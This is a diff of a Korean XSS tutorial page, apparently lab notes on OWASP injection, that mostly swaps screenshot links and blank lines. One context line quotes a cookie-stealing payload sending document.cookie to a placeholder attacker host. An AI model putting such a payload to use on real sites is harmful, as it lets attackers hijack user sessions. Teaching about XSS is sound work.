@@ -173,9 +173,10 @@ img.src = "htttp//ww.hacker.com/log.php?data=" + document.cookie); 처럼,<br>
 <br>
 <br>
 
-![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/14.png)<br>
+![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/20.png)<br>
 
 DOM-Based XSS는 서버를 거치지 않고 브라우저(클라이언트) 단계에서만 공격이 완성됩니다.
+
 <br>
 <br>
 <br>
@@ -183,10 +184,34 @@ DOM-Based XSS는 서버를 거치지 않고 브라우저(클라이언트) 단계
 <br>
 <br>
 
+![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/21.png)<br>
+
+<br>
+<br>
+<br>
+<br>
+<br>
+
+<br>![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/22.png)<br>
+
+<br>
+<br>
+<br>
+<br>
+<br>
+
+<br>![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/23.png)<br>
+
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
 
 ![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/15.png)<br>
 
-아래와 같이, 개발자 도구를 이용해 소스코드를 분석하고 공격을 수행합니다. 
+
 <br>
 <br>
 <br>
